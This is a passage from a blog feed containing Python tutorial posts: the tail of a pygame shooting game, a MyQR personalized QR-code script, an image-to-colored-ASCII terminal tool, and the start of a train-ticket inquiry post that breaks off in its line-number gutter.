// <span class="number">8</span></span><br><span class="line">        screen.blit(player.image[player.img_index], player.rect)</span><br><span class="line">        player_down_index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> player_down_index &gt; <span class="number">47</span>:</span><br><span class="line">            <span class="comment"># &#x51FB;&#x4E2D;&#x6548;&#x679C;&#x5904;&#x7406;&#x5B8C;&#x6210;&#x540E;&#x6E38;&#x620F;&#x7ED3;&#x675F;</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x654C;&#x673A;&#x88AB;&#x5B50;&#x5F39;&#x51FB;&#x4E2D;&#x6548;&#x679C;&#x663E;&#x793A;</span></span><br><span class="line">    <span class="keyword">for</span> enemy_down <span class="keyword">in</span> enemies_down:</span><br><span class="line">        <span class="keyword">if</span> enemy_down.down_index == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">if</span> enemy_down.down_index &gt; <span class="number">7</span>:</span><br><span class="line">            enemies_down.remove(enemy_down)</span><br><span class="line">            score += <span class="number">1000</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        screen.blit(enemy_down.down_imgs[enemy_down.down_index // <span class="number">2</span>], enemy_down.rect)</span><br><span class="line">        enemy_down.down_index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x663E;&#x793A;&#x5B50;&#x5F39;</span></span><br><span class="line">    player.bullets.draw(screen)</span><br><span class="line">    <span class="comment"># &#x663E;&#x793A;&#x654C;&#x673A;</span></span><br><span class="line">    enemies1.draw(screen)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x7ED8;&#x5236;&#x5F97;&#x5206;</span></span><br><span class="line">    score_font = pygame.font.Font(<span class="keyword">None</span>, <span class="number">36</span>)</span><br><span class="line">    score_text = score_font.render(str(score), <span class="keyword">True</span>, (<span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>))</span><br><span class="line">    text_rect = score_text.get_rect()</span><br><span class="line">    text_rect.topleft = [<span class="number">10</span>, <span class="number">10</span>]</span><br><span class="line">    screen.blit(score_text, text_rect)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x66F4;&#x65B0;&#x5C4F;&#x5E55;</span></span><br><span class="line">    pygame.display.update()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5904;&#x7406;&#x6E38;&#x620F;&#x9000;&#x51FA;</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> event.type == pygame.QUIT:</span><br><span class="line">            pygame.quit()</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x83B7;&#x53D6;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#xFF08;&#x4E0A;&#x4E0B;&#x5DE6;&#x53F3;&#x6309;&#x952E;&#xFF09;</span></span><br><span class="line">    key_pressed = pygame.key.get_pressed()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5904;&#x7406;&#x952E;&#x76D8;&#x4E8B;&#x4EF6;&#xFF08;&#x79FB;&#x52A8;&#x98DE;&#x673A;&#x7684;&#x4F4D;&#x7F6E;&#xFF09;</span></span><br><span class="line">    <span class="keyword">if</span> key_pressed[K_w] <span class="keyword">or</span> key_pressed[K_UP]:</span><br><span class="line">        player.moveUp()</span><br><span class="line">    <span class="keyword">if</span> key_pressed[K_s] <span class="keyword">or</span> key_pressed[K_DOWN]:</span><br><span class="line">        player.moveDown()</span><br><span class="line">    <span class="keyword">if</span> key_pressed[K_a] <span class="keyword">or</span> key_pressed[K_LEFT]:</span><br><span class="line">        player.moveLeft()</span><br><span class="line">    <span class="keyword">if</span> key_pressed[K_d] <span class="keyword">or</span> key_pressed[K_RIGHT]:</span><br><span class="line">        player.moveRight()</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6E38;&#x620F; Game Over &#x540E;&#x663E;&#x793A;&#x6700;&#x7EC8;&#x5F97;&#x5206;</span></span><br><span class="line">font = pygame.font.Font(<span class="keyword">None</span>, <span class="number">48</span>)</span><br><span class="line">text = font.render(<span class="string">&apos;Score: &apos;</span>+ str(score), <span class="keyword">True</span>, (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">text_rect = text.get_rect()</span><br><span class="line">text_rect.centerx = screen.get_rect().centerx</span><br><span class="line">text_rect.centery = screen.get_rect().centery + <span class="number">24</span></span><br><span class="line">screen.blit(game_over, (<span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">screen.blit(text, text_rect)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x663E;&#x793A;&#x5F97;&#x5206;&#x5E76;&#x5904;&#x7406;&#x6E38;&#x620F;&#x9000;&#x51FA;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="keyword">if</span> event.type == pygame.QUIT:</span><br><span class="line">            pygame.quit()</span><br><span class="line">            exit()</span><br><span class="line">    pygame.display.update()</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-09%2021-33-59.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> pygame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python generates a personalized QR code</title>
      <link href="/2018/10/09/Python-generates-a-personalized-QR-code/"/>
      <url>/2018/10/09/Python-generates-a-personalized-QR-code/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1530236619450.png" alt=""></p><a id="more"></a><p>img.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Usage: python3 img.py [image_name] [save_name]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">    -h --help       show this on screen.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MyQR <span class="keyword">import</span> myqr</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line"></span><br><span class="line">parser.add_argument(<span class="string">&apos;image_name&apos;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&apos;save_name&apos;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">img_name = args.file1</span><br><span class="line">save_name = args.file2</span><br><span class="line"></span><br><span class="line">myqr.run(words=<span class="string">&apos;https://www.shiyanlou.com&apos;</span>,</span><br><span class="line">        picture=img_name,</span><br><span class="line">        save_name=save_name,</span><br><span class="line">        colorized=<span class="keyword">True</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x751F;&#x6210;&#x7684;&#x56FE;&#x7247;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/mywebsite.gif" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python 3 implements image to color characters</title>
      <link href="/2018/10/08/Python-3-implements-image-to-color-characters/"/>
      <url>/2018/10/08/Python-3-implements-image-to-color-characters/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1517277942920.png" alt=""></p><a id="more"></a><p>colors.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x989C;&#x8272;&#x6620;&#x5C04;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rgb</span><span class="params">(red, green, blue)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">16</span> + (red * <span class="number">36</span>) + (green * <span class="number">6</span>) + blue</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x8BBE;&#x7F6E;&#x8F93;&#x51FA;&#x6837;&#x5F0F;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_style</span><span class="params">(fg=None, bg=None, bold=None)</span>:</span></span><br><span class="line">    <span class="comment"># &#x5C06;&#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A;&#x7A7A; end=&apos;&apos; &#x6D88;&#x9664;&#x81EA;&#x52A8;&#x6362;&#x884C;</span></span><br><span class="line">    print(_set_style(fg, bg, bold), end=<span class="string">&apos;&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9E;&#x73B0;&#x8BBE;&#x7F6E;&#x8F93;&#x51FA;&#x6837;&#x5F0F;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_set_style</span><span class="params">(fg=None, bg=None, bold=<span class="string">&apos;&apos;</span>)</span>:</span></span><br><span class="line">    result = <span class="string">&apos;&apos;</span></span><br><span class="line">    <span class="keyword">if</span> fg:</span><br><span class="line">        result += <span class="string">&apos;\x1b[38;5;%dm&apos;</span> % fg</span><br><span class="line">    <span class="keyword">if</span> bg:</span><br><span class="line">        result += <span class="string">&apos;\x1b[48;5;%dm&apos;</span> % bg</span><br><span class="line">    <span class="keyword">if</span> bold:</span><br><span class="line">        result += <span class="string">&apos;\x1b[1m&apos;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x91CD;&#x7F6E;&#x989C;&#x8272;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_color</span><span class="params">()</span>:</span></span><br><span class="line">    print(_reset_color(), end=<span class="string">&apos;&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x5B9E;&#x73B0;&#x91CD;&#x7F6E;&#x989C;&#x8272;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_reset_color</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&apos;\x1b[0m&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x6253;&#x5370;&#x5B57;&#x7B26;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_color</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line">    fg = kwargs.pop(<span class="string">&apos;fg&apos;</span>, <span class="keyword">None</span>)</span><br><span class="line">    bg = kwargs.pop(<span class="string">&apos;bg&apos;</span>, <span class="keyword">None</span>)</span><br><span class="line">    bold = kwargs.pop(<span class="string">&apos;bold&apos;</span>, <span class="keyword">None</span>)</span><br><span class="line">    set_style(fg, bg, bold)</span><br><span class="line">    print(*args, **kwargs)</span><br><span class="line">    reset_color()</span><br></pre></td></tr></tbody></table></figure><p></p><p>i2a.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ###     ####         ######</span></span><br><span class="line"><span class="string">          ###  ###      #    ###</span></span><br><span class="line"><span class="string">    ###         ###       ######</span></span><br><span class="line"><span class="string">    ###      ####       ###   ##</span></span><br><span class="line"><span class="string">    ###    ####        ###    ##</span></span><br><span class="line"><span class="string">    ###   ##########    ##### ###</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i2a creates ASCII art from images right on your terminal.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage: i2a [options] [FILE]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">  -h --help            Show this on screen.</span></span><br><span class="line"><span class="string">  -v --version         Show version.</span></span><br><span class="line"><span class="string">  -c --colors          Show colored output.</span></span><br><span class="line"><span class="string">  -b --bold            Output bold characters</span></span><br><span class="line"><span class="string">  --contrast=&lt;factor&gt;  Manually set contrast [default: 1.5].</span></span><br><span class="line"><span class="string">  --alt-chars          Use an alternate set of characters.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> colors <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageEnhance</span><br><span class="line"><span class="keyword">from</span> docopt <span class="keyword">import</span> docopt</span><br><span class="line"></span><br><span class="line">__version__ = <span class="string">&apos;1.0&apos;</span></span><br><span class="line"></span><br><span class="line">_ASCII = <span class="string">&quot;@80GCLft1i;:,. &quot;</span></span><br><span class="line">_ASCII_2 = <span class="string">&quot;Q0RMNWBDHK@$U8&amp;AOkYbZGPXgE4dVhgSqm6pF523yfwCJ#TnuLjz7oeat1[]!?I}*{srlcxvi)&gt;&lt;\\)|\&quot;/+=^;,:&apos;_-`. &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x56FE;&#x50CF;&#x8F6C;&#x5F69;&#x8272;&#x5B57;&#x7B26;&#x51FD;&#x6570;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display_output</span><span class="params">(arguments)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> _ASCII</span><br><span class="line">    <span class="keyword">if</span> arguments[<span class="string">&apos;--alt-chars&apos;</span>]:</span><br><span class="line">        _ASCII = _ASCII_2</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        im = Image.open(arguments[<span class="string">&apos;FILE&apos;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">raise</span> IOError(<span class="string">&apos;Unable to open the file&apos;</span>)</span><br><span class="line"></span><br><span class="line">    im = im.convert(<span class="string">&quot;RGBA&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _HEIGHT, _WIDTH = map(int, subprocess.check_output([<span class="string">&apos;stty&apos;</span>, <span class="string">&apos;size&apos;</span>]).split())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        _HEIGHT, _WIDTH = <span class="number">50</span>, <span class="number">50</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x6309;&#x6BD4;&#x4F8B;&#x7F29;&#x653E;&#x56FE;&#x50CF;</span></span><br><span class="line">    aspect_ratio    = im.size[<span class="number">0</span>] / im.size[<span class="number">1</span>]</span><br><span class="line">    scaled_height   = _WIDTH / aspect_ratio</span><br><span class="line">    scaled_width    = _HEIGHT * aspect_ratio * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x8BA1;&#x7B97;&#x8C03;&#x6574;&#x4E4B;&#x540E;&#x7684;&#x56FE;&#x50CF;&#x7684;&#x5BBD;&#x9AD8;</span></span><br><span class="line">    width = scaled_width</span><br><span class="line">    height = scaled_height</span><br><span class="line">    <span class="keyword">if</span> scaled_width &gt; _WIDTH:</span><br><span class="line">        width = int(_WIDTH)</span><br><span class="line">        height = int(scaled_height / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> scaled_height &gt; _HEIGHT:</span><br><span class="line">        width = int(scaled_width)</span><br><span class="line">        height = int(_HEIGHT)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5C06;&#x56FE;&#x50CF;&#x957F;&#x5BBD;&#x8F6C;&#x6362;&#x4E3A;&#x6307;&#x5B9A;&#x503C;</span></span><br><span class="line">    <span class="comment"># resample &#x53C2;&#x6570;&#x53EF;&#x9009;&#xFF0C;&#x6307;&#x5B9A;&#x4E86;&#x5728;&#x53D8;&#x6362;&#x56FE;&#x50CF;&#x5927;&#x5C0F;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x91C7;&#x6837;&#x65B9;&#x5F0F;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x8F6C;&#x53D8;&#x4E4B;&#x540E;&#x7684;&#x56FE;&#x50CF;&#x8D28;&#x91CF;&#xFF0C;&#x6211;&#x4EEC;&#x91C7;&#x7528; PIL.Image.ANTIALIAS &#x9009;&#x9879;&#x6307;&#x5B9A;&#x9AD8;&#x8D28;&#x91CF;&#x7684;&#x91C7;&#x6837;&#x6EE4;&#x6CE2;&#x5668;&#x3002;</span></span><br><span class="line">    im = im.resize((width,height), resample=Image.ANTIALIAS)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x521B;&#x5EFA; PIL.ImageEnhance.Contrast &#x5BF9;&#x8C61;&#xFF0C;&#x7528;&#x4E8E;&#x8C03;&#x6574;&#x5BF9;&#x6BD4;&#x5EA6;</span></span><br><span class="line">    enhancer = ImageEnhance.Contrast(im)</span><br><span class="line">    im = enhancer.enhance(float(arguments[<span class="string">&apos;--contrast&apos;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x83B7;&#x53D6; im &#x7684;&#x56FE;&#x50CF;&#x6570;&#x636E;</span></span><br><span class="line">    <span class="comment"># &#x8FD4;&#x56DE;&#x503C;&#x4E3A; list &#x5BF9;&#x8C61;</span></span><br><span class="line">    img = im.getdata()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5C06;&#x56FE;&#x50CF;&#x8F6C;&#x6362;&#x4E3A;&#x7070;&#x9636;&#x56FE;</span></span><br><span class="line">    im = im.convert(<span class="string">&apos;L&apos;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x5B9A;&#x4E49;&#x524D;&#x666F;&#x8272;&#x4E0E;&#x80CC;&#x666F;&#x8272;</span></span><br><span class="line">    bg = rgb(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    fg = rgb(<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x662F;&#x5426;&#x52A0;&#x7C97;&#x663E;&#x793A;&#x5B57;&#x7B26;</span></span><br><span class="line">    bold = <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> arguments[<span class="string">&apos;--bold&apos;</span>]:</span><br><span class="line">        bold = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bold = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x7528;&#x4E8E;&#x8BA1;&#x6570;&#x5F53;&#x524D;&#x5728;&#x7B2C;&#x51E0;&#x5217;&#x6253;&#x5370;</span></span><br><span class="line">    row_len = <span class="number">0</span></span><br><span class="line">    <span class="comment"># &#x904D;&#x5386;&#x6BCF;&#x4E2A;&#x50CF;&#x7D20;&#x70B9;</span></span><br><span class="line">    <span class="keyword">for</span> (count, i) <span class="keyword">in</span> enumerate(im.getdata()):</span><br><span class="line">        <span class="comment"># &#x5C06;&#x50CF;&#x7D20;&#x503C;&#x6620;&#x5C04;&#x5230;&#x76F8;&#x5E94;&#x7684;&#x5B57;&#x7B26;</span></span><br><span class="line">        ascii_char = _ASCII[int((i / <span class="number">255.0</span>) * (len(_ASCII) - <span class="number">1</span>))]</span><br><span class="line">        <span class="comment"># &#x82E5;&#x8981;&#x6C42;&#x8F6C;&#x6210;&#x5F69;&#x8272;&#x5B57;&#x7B26;</span></span><br><span class="line">        <span class="keyword">if</span> arguments[<span class="string">&apos;--colors&apos;</span>]:</span><br><span class="line">            <span class="comment"># &#x989C;&#x8272;&#x6620;&#x5C04;</span></span><br><span class="line">            color = rgb(int((img[count][<span class="number">0</span>] / <span class="number">255.0</span>) * <span class="number">5</span>), int((img[count][<span class="number">1</span>] / <span class="number">255.0</span>) * <span class="number">5</span>),int((img[count][<span class="number">2</span>] / <span class="number">255.0</span>) * <span class="number">5</span>))</span><br><span class="line">            <span class="comment"># &#x80CC;&#x666F;&#x8272;&#x8BBE;&#x7F6E;&#x4E3A;&#x8BE5;&#x989C;&#x8272;</span></span><br><span class="line">            bg = color</span><br><span class="line">            <span class="comment"># &#x524D;&#x666F;&#x8272;&#x7F6E;&#x4F4D;&#x9ED1;&#x8272;</span></span><br><span class="line">            fg = rgb(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="comment"># &#x6253;&#x5370;&#x5B57;&#x7B26;</span></span><br><span class="line">        print_color(<span class="string">&apos; &apos;</span>, end=<span class="string">&apos;&apos;</span>, fg=fg, bg=bg, bold=bold)</span><br><span class="line"></span><br><span class="line">        row_len += <span class="number">1</span></span><br><span class="line">        <span class="comment"># &#x5F53;&#x5217;&#x6570;&#x7B49;&#x4E8E;&#x7EC8;&#x7AEF;&#x5BBD;&#x7684;&#x65F6;&#x5019;&#x8FDB;&#x884C;&#x6362;&#x884C;&#xFF0C;&#x5E76;&#x5C06; row_len &#x91CD;&#x65B0;&#x7F6E; 1</span></span><br><span class="line">        <span class="keyword">if</span> row_len == width:</span><br><span class="line">            row_len = <span class="number">0</span></span><br><span class="line">            print(<span class="string">&apos;&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># &#x83B7;&#x53D6;&#x547D;&#x4EE4;&#x884C;&#x53C2;&#x6570;&#x89E3;&#x6790;&#x4E4B;&#x540E;&#x7684;&#x5B57;&#x5178;</span></span><br><span class="line">    arguments = docopt(__doc__, version=__version__)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># &#x82E5;&#x6CA1;&#x6709; FILE &#x53C2;&#x6570;&#xFF0C;&#x5219;&#x6253;&#x5370;&#x5E2E;&#x52A9;&#x4FE1;&#x606F;</span></span><br><span class="line">    <span class="comment"># &#x82E5;&#x6709;&#x5219;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#x5DE5;&#x4F5C;</span></span><br><span class="line">    <span class="keyword">if</span> arguments[<span class="string">&apos;FILE&apos;</span>]:</span><br><span class="line">        display_output(arguments)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(__doc__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&apos;__main__&apos;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD0;&#x884C;&#x7ED3;&#x679C;&#xFF1A;<br><img src="http://p4wiqzx0i.bkt.clouddn.com/Screenshot%20from%202018-10-08%2021-30-14.png" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python implementation of train ticket inquiry tool</title>
      <link href="/2018/10/07/Python-implementation-of-train-ticket-inquiry-tool/"/>
      <url>/2018/10/07/Python-implementation-of-train-ticket-inquiry-tool/</url>
      
        <content type="html"><![CDATA[<p><img src="http://p4wiqzx0i.bkt.clouddn.com/1471855450482.png" alt=""></p><a id="more"></a><p>Code:<br>ticket.py<br></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 